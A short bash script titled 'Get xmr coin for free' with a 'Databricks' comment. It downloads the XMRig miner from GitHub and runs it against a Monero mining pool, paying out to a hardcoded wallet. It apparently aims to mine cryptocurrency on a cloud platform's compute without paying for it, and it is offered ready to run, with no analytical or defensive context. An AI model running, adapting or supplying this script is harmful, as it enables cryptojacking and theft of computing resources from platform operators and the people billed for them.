#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o sg.minexmr.com:443 -u 8A6bz3PtqrN6maGwzXMRvTPKbhYPqsYiuCtE1QJiYxb8NtTggLRRd4U7Sr9cPeT9H8XbKWT5Qikt7d5WGB9p2mxQRx5Q1B4ss -k --tls --rig-id ropali
